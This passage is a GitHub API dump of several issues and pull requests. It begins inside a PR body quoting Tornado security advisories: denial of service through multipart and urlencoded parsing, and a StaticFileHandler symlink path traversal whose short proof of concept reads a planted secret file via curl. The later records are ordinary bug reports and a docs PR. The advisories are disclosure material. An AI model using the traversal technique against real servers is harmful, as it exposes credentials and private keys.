(DoS).\n\n**Severity: High**\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-jhmp-mqwm-3gq8](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-jhmp-mqwm-3gq8)\n- [https://nvd.nist.gov/vuln/detail/CVE-2025-67726](https://nvd.nist.gov/vuln/detail/CVE-2025-67726)\n- [https://github.com/tornadoweb/tornado/commit/771472cfdaeebc0d89a9cc46e249f8891a6b29cd](https://redirect.github.com/tornadoweb/tornado/commit/771472cfdaeebc0d89a9cc46e249f8891a6b29cd)\n- [https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-267.yaml](https://redirect.github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-267.yaml)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.3](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.3)\n- [https://github.com/advisories/GHSA-jhmp-mqwm-3gq8](https://redirect.github.com/advisories/GHSA-jhmp-mqwm-3gq8)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-jhmp-mqwm-3gq8) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### tornado: multipart split() creates huge temp list before max_parts check -> memory amplification DoS (httputil.py:34)\n[GHSA-8423-8fgw-73vq](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Description\n\n##### Summary\n\n`parse_multipart_form_data` (httputil.py:34) calls\n`data.split(b\"--\"+boundary+b\"\\r\\n\")` **before** the `max_parts` check (:35).\nA 600KB body with 100k parts creates a 100k-element transient list first,\nthen rejects   transient memory amplification (each split element is a copy).\nPre-auth HTTP DoS.\n\n##### Root cause\n\n```python\nparts = data[:final_boundary_index].split(b\"--\" + boundary + b\"\\r\\n\")  # :34  huge list first\nif len(parts) > config.max_parts:                                       # :35  check after\n    raise HTTPInputError(\"multipart/form-data has too many parts\")\n```\n\n##### PoC\n\ngist: https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617\n`poc.py` + `output.txt` (100k parts from 600KB   transient list).\n\n##### Fix\n\nCount separators without materializing the list (e.g. `data.count(b\"--\"+boundary)` first).\n\n##### Credit\n\nReported by afldl, 2026-07.\n\n#### Severity\n- CVSS Score: 6.9 / 10 (Medium)\n- Vector String: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-8423-8fgw-73vq](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-8423-8fgw-73vq)\n- [https://github.com/tornadoweb/tornado/pull/3704](https://redirect.github.com/tornadoweb/tornado/pull/3704)\n- [https://github.com/tornadoweb/tornado/commit/de85b3f87446e323e881bbaa3d5a74f4b76e5f05](https://redirect.github.com/tornadoweb/tornado/commit/de85b3f87446e323e881bbaa3d5a74f4b76e5f05)\n- [https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617](https://gist.github.com/afldl/649861f25d39b53b7edbe0298e171617)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.8](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.8)\n- [https://github.com/advisories/GHSA-8423-8fgw-73vq](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-8423-8fgw-73vq) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n###  Tornado: Urlencoded body parsing omits max_num_fields, so one request can stall the event loop\n[CVE-2026-82397](https://nvd.nist.gov/vuln/detail/CVE-2026-82397) / [GHSA-mpf4-983q-p7j4](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nTornado parses `application/x-www-form-urlencoded` bodies with `urllib.parse.parse_qs` and does not pass `max_num_fields`. A body made almost entirely of separators produces tens of millions of fields, and the parse happens on the event loop before the handler runs, so a single request stalls the whole server.\n\n##### Where it is\n\n`tornado/escape.py`, at HEAD `e530031405e2154654dedc4c84d5656b557ea310`:\n\n```python\nresult = urllib.parse.parse_qs(\n    qs, keep_blank_values, strict_parsing, encoding=\"latin1\", errors=\"strict\"\n)\n```\n\n`max_num_fields` is the parameter CPython added for exactly this, and it is absent.\n\nThe path to it is entirely server-side and pre-dispatch. `RequestHandler._execute` parses the body at `tornado/web.py:1821`, which reaches `HTTPServerRequest._parse_body` at `tornado/httputil.py:636`, and the urlencoded branch of `parse_body_arguments` calls `parse_qs_bytes` at `tornado/httputil.py:1030`.\n\nThe size that reaches it is bounded only by the body cap, which defaults to the stream's `max_buffer_size` of 104857600 at `tornado/iostream.py:239`, applied as the request body default at `tornado/http1connection.py:136-140`. A 100 MB body of separators is around fifty million fields.\n\n##### Impact\n\nDenial of service against the whole process, not one request. Tornado is single-threaded and the parse is synchronous on the event loop, so every other connection waits. No authentication is needed if any route accepts a form post, which is the normal case.\n\n##### Suggested fix\n\nPass a bound:\n\n```python\nresult = urllib.parse.parse_qs(\n    qs, keep_blank_values, strict_parsing, encoding=\"latin1\", errors=\"strict\",\n    max_num_fields=max_num_fields,\n)\n```\n\nwith a conservative default and a way for applications to raise it. CPython raises `ValueError` when the limit is exceeded, which maps cleanly onto a 400.\n\nLowering the default body cap for urlencoded specifically would help too, since 100 MB of form fields is not a shape any real client sends.\n\n##### Why I do not think this is a duplicate\n\nThe published tornado advisories cover out-of-bounds access in the C extension, unbounded accumulation of decompressed chunks in `AsyncHTTPClient`, the Authorization header surviving cross-origin redirects, credential leakage on curl handle reuse, and cookie attribute validation. The decompression one is the nearest in spirit and is on the client side; this is the server parsing a request body. The call is unchanged at HEAD.\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-mpf4-983q-p7j4](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-mpf4-983q-p7j4)\n- [https://nvd.nist.gov/vuln/detail/CVE-2026-82397](https://nvd.nist.gov/vuln/detail/CVE-2026-82397)\n- [https://github.com/tornadoweb/tornado/pull/3704](https://redirect.github.com/tornadoweb/tornado/pull/3704)\n- [https://github.com/tornadoweb/tornado/commit/8d6363ed7b69d5f0da806efe34d256627a2191de](https://redirect.github.com/tornadoweb/tornado/commit/8d6363ed7b69d5f0da806efe34d256627a2191de)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.8](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.8)\n- [https://github.com/advisories/GHSA-mpf4-983q-p7j4](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-mpf4-983q-p7j4) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: StaticFileHandler follows symlinks outside static root (path traversal)\n[GHSA-c2m8-h5v5-343r](https://redirect.github.com/advisories/GHSA-c2m8-h5v5-343r)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\nStaticFileHandler allows an unauthenticated attacker to read arbitrary files from the server's filesystem by requesting a path that resolves to a symbolic link placed inside the static root directory. Any application that serves user-uploadable content, or whose static directory is populated by a build/deploy pipeline that creates symlinks (e.g. npm link, webpack, Docker volume mounts, CDN sync tools), is affected. An attacker who can trigger the creation of a symlink pointing outside the static root—or exploit one that already exists—can retrieve sensitive files such as /etc/passwd, private keys, configuration files, or application secrets.\n\n##### Details\nThe vulnerability is in tornado.web.StaticFileHandler, specifically in the interaction between two methods in [tornado/web.py](vscode-webview://1grdaaa6v64itrol06qu70pq3d1b9h9im5c3npvvc9snaprc1q9f/tornado/web.py):\n- [get_absolute_path](https://redirect.github.com/tornadoweb/tornado/blob/0ca3c5f8279d402b245718d16522bc18a8f5d958/tornado/web.py#L2932) uses `os.path.abspath()` to resolve the requested path:\n- [validate_absolute_path](https://redirect.github.com/tornadoweb/tornado/blob/0ca3c5f8279d402b245718d16522bc18a8f5d958/tornado/web.py#L2935) uses the same `os.path.abspath()` on the root, then performs a string prefix check:\n\n`os.path.abspath()` normalises . and .. segments but does not resolve symbolic links. As a result, a path like `/var/www/static/link` passes the `startswith(\"/var/www/static/\")` check regardless of where `link` actually points.\n\nImmediately after, `os.path.exists()` and `os.path.isfile()`  **do follow symlinks**, so the file they ultimately open is the symlink's target. The fix would be to replace os.path.abspath() with os.path.realpath() in both methods, so the resolved real path of the symlink target is validated against the root, not just its string representation inside the static directory.\n\n##### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._\nPrerequisites: Python 3.x, Tornado installed.\n1. Create the environment\n```\nmkdir -p /tmp/static\necho \"DB_PASSWORD=s3cr3t\" > /tmp/secret.conf   \nln -s /tmp/secret.conf /tmp/static/config.conf \n```\n2. Minimal vulnerable server (server.py):\n```\nimport tornado.web, tornado.ioloop\n\napp = tornado.web.Application([\n    (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"/tmp/static\"}),\n])\napp.listen(8888)\ntornado.ioloop.IOLoop.current().start()\n```\n3. Exploit:\n`curl http://localhost:8888/static/config.conf`\n\n##### Impact\nAny application using StaticFileHandler is potentially affected if:\n- the static directory contains symlinks pointing outside it (common with build tooling), or\n- the application allows file uploads into the static directory without stripping symlinks.\n\nAn unauthenticated remote attacker can read any file readable by the process user: application secrets, private TLS keys, database credentials, /etc/shadow, SSH keys, or source code (depending on the process's filesystem permissions).\n\n#### Severity\n- CVSS Score: 8.2 / 10 (High)\n- Vector String: `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-c2m8-h5v5-343r](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-c2m8-h5v5-343r)\n- [https://github.com/tornadoweb/tornado/pull/3719](https://redirect.github.com/tornadoweb/tornado/pull/3719)\n- [https://github.com/tornadoweb/tornado/commit/437ab5f76565403b3403438d2e555d11f8128d32](https://redirect.github.com/tornadoweb/tornado/commit/437ab5f76565403b3403438d2e555d11f8128d32)\n- [https://github.com/tornadoweb/tornado/commit/f9f50b8bab265a2abf9f2415a3d2da6264a5450b](https://redirect.github.com/tornadoweb/tornado/commit/f9f50b8bab265a2abf9f2415a3d2da6264a5450b)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.9](https://redirect.github.com/tornadoweb/tornado/re\n\n> [!IMPORTANT]\n> ✂ PR body was truncated to here.\n","reactions":{"url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/SEA-AI/templatepy/issues/37/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/seedds/nxnative/issues/2039","repository_url":"https://api.github.com/repos/seedds/nxnative","labels_url":"https://api.github.com/repos/seedds/nxnative/issues/2039/labels{/name}","comments_url":"https://api.github.com/repos/seedds/nxnative/issues/2039/comments","events_url":"https://api.github.com/repos/seedds/nxnative/issues/2039/events","html_url":"https://github.com/seedds/nxnative/issues/2039","id":6292611022,"node_id":"I_kwDOVG4bQs8AAAABdxGfzg","number":2039,"title":"Title: Tomodachi Life: Living the Dream (010051F0207B2000): blank Mii editor preview, black blocks around street lamps","user":{"login":"calablox","id":311769626,"node_id":"U_kgDOEpU6Gg","avatar_url":"https://avatars.githubusercontent.com/u/311769626?v=4","gravatar_id":"","url":"https://api.github.com/users/calablox","html_url":"https://github.com/calablox","followers_url":"https://api.github.com/users/calablox/followers","following_url":"https://api.github.com/users/calablox/following{/other_user}","gists_url":"https://api.github.com/users/calablox/gists{/gist_id}","starred_url":"https://api.github.com/users/calablox/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/calablox/subscriptions","organizations_url":"https://api.github.com/users/calablox/orgs","repos_url":"https://api.github.com/users/calablox/repos","events_url":"https://api.github.com/users/calablox/events{/privacy}","received_events_url":"https://api.github.com/users/calablox/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":12938335364,"node_id":"LA_kwDOVG4bQs8AAAADAy9UhA","url":"https://api.github.com/repos/seedds/nxnative/labels/game:%20010051F0207B2000","name":"game: 010051F0207B2000","color":"f9d0c4","default":false,"description":"A game profile","archived_at":null,"archived_by":null}],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-09T18:56:02Z","updated_at":"2026-11-10T15:02:53Z","closed_at":null,"assignee":null,"author_association":"NONE","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"Game: Tomodachi Life: Living the Dream, title ID 010051F0207B2000, version 1.0.4 (v262144), SDK 20.5.3\nDevices: iPad Pro M2 (iPadOS 27.2, LiveContainer) and MacBook Pro M1 (macOS 27.2, mac-app). Same bugs on both.\nnxnative: commit 7f50222003e4, provisional profile written by the survey\n\nWhat works: the game boots, island Miis render correctly, UI renders, ~30 fps, no crash.\n\nBug 1 – Miis rendered into the UI are blank (iOS and Mac).\nEvery Mii the game draws live into a UI element is missing, while the element's own\nbackground renders fine:\n- \"Which Mii do you want to start with?\" screen (new game): both starting Miis are missing,\n  only their card backgrounds show. Easiest repro: start a new game.\n- Mii editor (\"From Scratch\"): the whole 3D preview is missing, body included.\n- Some 2D Mii icons in menus are blank while others display.\nThe same screens on ryujinx 1.3.352 with the same dump and update show the Miis correctly\n(screenshots attached side by side). Island Miis in the 3D world render fine on nxnative,\nso the Mii models themselves work: the render-to-texture pass for UI Miis seems lost.\nPossibly related [RED] line: \"texture 48×96×1 declares 15 levels, its size holds 7 (format 0x38)\".\n\nBug 2 – Street lamps in daylight: a large black, blocky, stair-stepped shape surrounded by a\nwhite halo is drawn around street lamps, with occasional flashes. The stair-step pattern looks\nlike a NaN/Inf spreading through a bloom/glow downsample chain.\nrender_cond on: not tested yet \n\nLog: no [RED] line when the editor opens. [RED] lines early in the run:\n- [nvn] SetRenderEnableConditional: the host draws anyway for now\n- [nvn-mtl] texture 48×96×1 declares 15 levels, its size holds 7 (format 0x38)\n- [nvn-mtl] color slot 1 holds the same texture as an earlier slot (ser=17119) and this\n  draw writes it (mask 0x8): these writes are lost\n\nAttached: iPad log.txt, Mac log, survey.md, screenshots of both bugs (iPad and Mac).\n\n\n[010051F0207B2000.log](https://github.com/user-attachments/files/34593725/010051F0207B2000.log)\n\n[log.txt](https://github.com/user-attachments/files/34593829/log.txt)\n\n[survey.md](https://github.com/user-attachments/files/34593969/survey.md)\n\n<img width=\"998\" height=\"586\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/0e60a51e-a0cd-42e2-a62f-3e45e9464009\" />\n<img width=\"998\" height=\"586\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d5d67e5e-aeb5-4df2-a45b-af436ae3eb08\" />\n<img width=\"2048\" height=\"1151\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/87738653-1a2a-40d8-9777-dfbb63362e21\" />\n\n<img width=\"2048\" height=\"1151\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d8ed31d9-d047-48d8-aba8-a3ac8e3c26c4\" />\n<img width=\"2048\" height=\"1536\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/dab5f764-e895-4307-b8ee-0448ea3a75f0\" />","reactions":{"url":"https://api.github.com/repos/seedds/nxnative/issues/2039/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/seedds/nxnative/issues/2039/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8","repository_url":"https://api.github.com/repos/cooperross399/nhl-betting-lab","labels_url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8/labels{/name}","comments_url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8/comments","events_url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8/events","html_url":"https://github.com/cooperross399/nhl-betting-lab/issues/8","id":5250176756,"node_id":"I_kwDOUEKZRs8AAAABOO9W9A","number":8,"title":"NHL Betting Lab — Claude Operating Home","user":{"login":"cooperross399","id":301001385,"node_id":"U_kgDOEfDqqQ","avatar_url":"https://avatars.githubusercontent.com/u/301001385?v=4","gravatar_id":"","url":"https://api.github.com/users/cooperross399","html_url":"https://github.com/cooperross399","followers_url":"https://api.github.com/users/cooperross399/followers","following_url":"https://api.github.com/users/cooperross399/following{/other_user}","gists_url":"https://api.github.com/users/cooperross399/gists{/gist_id}","starred_url":"https://api.github.com/users/cooperross399/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/cooperross399/subscriptions","organizations_url":"https://api.github.com/users/cooperross399/orgs","repos_url":"https://api.github.com/users/cooperross399/repos","events_url":"https://api.github.com/users/cooperross399/events{/privacy}","received_events_url":"https://api.github.com/users/cooperross399/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":101,"created_at":"2026-08-25T20:13:22Z","updated_at":"2026-11-10T14:57:46Z","closed_at":null,"assignee":null,"author_association":"OWNER","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"This is the operating home for the NHL Betting Lab.\n\nEvery gameday card is posted here as a comment when the selections change, and\nwhenever a run is degraded. When the selections differ from the previous card,\nthe comment's first paragraph contains the phrase \"Selections changed\".\n\n**Recommendations only. No bet is ever placed by this repository.**\n\nWhat the evidence actually supports:\n\n- `data/outputs/player_props_backtest.md`\n- `data/outputs/props_calibration.md`\n- `data/outputs/what_we_can_claim.md`\n","reactions":{"url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/cooperross399/nhl-betting-lab/issues/8/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040","repository_url":"https://api.github.com/repos/ly05010419/MacNativeGames","labels_url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040/labels{/name}","comments_url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040/comments","events_url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040/events","html_url":"https://github.com/ly05010419/MacNativeGames/issues/2040","id":6309424821,"node_id":"I_kwDOVNvIis8AAAABeBIutQ","number":2040,"title":"Ocarina of Time (Mac): gpu_hang_guard aborts — the GPU hang watchdog ends the game on M1 Max (32 GPU cores)","user":{"login":"Dmitriy-Romanov","id":58721805,"node_id":"MDQ6VXNlcjU4NzIxODA1","avatar_url":"https://avatars.githubusercontent.com/u/58721805?v=4","gravatar_id":"","url":"https://api.github.com/users/Dmitriy-Romanov","html_url":"https://github.com/Dmitriy-Romanov","followers_url":"https://api.github.com/users/Dmitriy-Romanov/followers","following_url":"https://api.github.com/users/Dmitriy-Romanov/following{/other_user}","gists_url":"https://api.github.com/users/Dmitriy-Romanov/gists{/gist_id}","starred_url":"https://api.github.com/users/Dmitriy-Romanov/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Dmitriy-Romanov/subscriptions","organizations_url":"https://api.github.com/users/Dmitriy-Romanov/orgs","repos_url":"https://api.github.com/users/Dmitriy-Romanov/repos","events_url":"https://api.github.com/users/Dmitriy-Romanov/events{/privacy}","received_events_url":"https://api.github.com/users/Dmitriy-Romanov/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-10T14:57:28Z","updated_at":"2026-11-10T14:57:28Z","closed_at":null,"assignee":null,"author_association":"NONE","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"# Ocarina of Time (Mac): gpu_hang_guard aborts — the GPU hang watchdog ends the game on M1 Max\n\n## Environment\n\n- App built from `main` at `ca3c4ad6` (2026-11-10), full player build from a `.nup` dump (`v131072`).\n- Mac: **Apple M1 Max (32 GPU cores, `applegpu_g13s`)**, MacBookPro18,2, macOS 27.2.1 (26B131), built-in Retina display.\n- In-game power draw ~40 W while plugged in; the crash happens during normal play, repeatedly (\"often\").\n\n## What happens\n\nThe game aborts during play. macOS crash report (one representative instance):\n\n```\nProcess:             OcarinaOfTime [33168]\nIdentifier:          org.macnativegames.oot\nVersion:             131072 (131072)\nHardware Model:      MacBookPro18,2\nOS Version:          macOS 27.2.1 (26B131)\nTriggered by Thread: 103, Dispatch Queue: com.Metal4.CompletionQueue\n\nException Type:    EXC_CRASH (SIGABRT)\n\nThread 103 Crashed::  Dispatch queue: com.Metal4.CompletionQueue\n0   libsystem_kernel.dylib        __pthread_kill + 8\n2   libsystem_c.dylib             abort + 148\n3   OcarinaOfTime                 gpu_hang_guard + 32 (nvn_mtl.m:2721) [inlined]\n4   OcarinaOfTime                 __mtl_sub_commit_block_invoke.121.cold.1 + 60 (nvn_mtl.m:2881)\n5   OcarinaOfTime                 gpu_hang_guard + 8 (nvn_mtl.m:2721) [inlined]\n6   OcarinaOfTime                 __mtl_sub_commit_block_invoke.121 + 3120 (nvn_mtl.m:2881)\n7   Metal                         -[_MTL4CommitFeedbackDispatch executeBlocksWithCommitFeedback:] + 72\n8   IOGPU                         -[IOGPUMetal4CommandQueue commandBufferComplete:...:kernelError:error:...] + 188\n```\n\nSo the MTL4 completion queue reports a `kernelError` for a committed command buffer, `gpu_hang_guard` (nvn_mtl.m:2721) treats it as a GPU hang and calls `abort()` by design.\n\n## Notes\n\n- I also see the title-screen attract movie with rolling horizontal noise lines and GPU pinned at 98% (reported separately as #2039) — possibly unrelated, possibly the same underlying GPU-side problem on this chip.\n- The full crash report is available; I can attach more instances (the crash repeats).\n- Happy to run any diagnostic flags that would record the offending submission before the guard fires.\n\n## Steps to reproduce\n\nPlay the game normally on an M1 Max; within a session the game aborts with the stack above. Happens repeatedly across sessions.\n","reactions":{"url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/ly05010419/MacNativeGames/issues/2040/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/issues/2","repository_url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin","labels_url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/issues/2/labels{/name}","comments_url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/issues/2/comments","events_url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/issues/2/events","html_url":"https://github.com/moose-tracker/moose-tracker-plugin/pull/2","id":6309304417,"node_id":"PR_kwDOVZwVBc8AAAABOIdzEw","number":2,"title":"Docs and versions for MCP 1.2.10","user":{"login":"kalexander-moose","id":349030309,"node_id":"U_kgDOFM3HpQ","avatar_url":"https://avatars.githubusercontent.com/u/349030309?v=4","gravatar_id":"","url":"https://api.github.com/users/kalexander-moose","html_url":"https://github.com/kalexander-moose","followers_url":"https://api.github.com/users/kalexander-moose/followers","following_url":"https://api.github.com/users/kalexander-moose/following{/other_user}","gists_url":"https://api.github.com/users/kalexander-moose/gists{/gist_id}","starred_url":"https://api.github.com/users/kalexander-moose/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/kalexander-moose/subscriptions","organizations_url":"https://api.github.com/users/kalexander-moose/orgs","repos_url":"https://api.github.com/users/kalexander-moose/repos","events_url":"https://api.github.com/users/kalexander-moose/events{/privacy}","received_events_url":"https://api.github.com/users/kalexander-moose/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-10T14:51:04Z","updated_at":"2026-11-10T14:51:46Z","closed_at":"2026-11-10T14:51:45Z","assignee":null,"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/pulls/2","html_url":"https://github.com/moose-tracker/moose-tracker-plugin/pull/2","diff_url":"https://github.com/moose-tracker/moose-tracker-plugin/pull/2.diff","patch_url":"https://github.com/moose-tracker/moose-tracker-plugin/pull/2.patch","merged_at":"2026-11-10T14:51:45Z"},"body":"## Summary\n\nDocs and version numbers for Moose Tracker MCP 1.2.10, which is live on `mcp.moosetracker.app`.\n\n- **README and SKILL:** the polyphony line now says note-list velocity is 0-64, the same scale as `vNN` in MTL. In 1.2.10 note lists use the volume column's own scale (they took 1-127 before, halved by the engine). Same text as `plugin/moose-tracker` in moose-tracker-web at `v1.2.10`.\n- **Versions:** `.grok-plugin/plugin.json` (was 1.1.1) and the `moosetracker-mcp` package at 1.2.10. The listing description in `plugin.json` is unchanged.\n- **Publishing:** merging publishes nothing. The npm package is published only by a GitHub Release or a manual run of `npm-publish`; the bridge code is unchanged, so that is optional.\n\n## Testing\n\n`npm test` in `packages/moosetracker-mcp` passes.\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)\n","reactions":{"url":"https://api.github.com/repos/moose-tracker/moose-tracker-plugin/issues/2/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":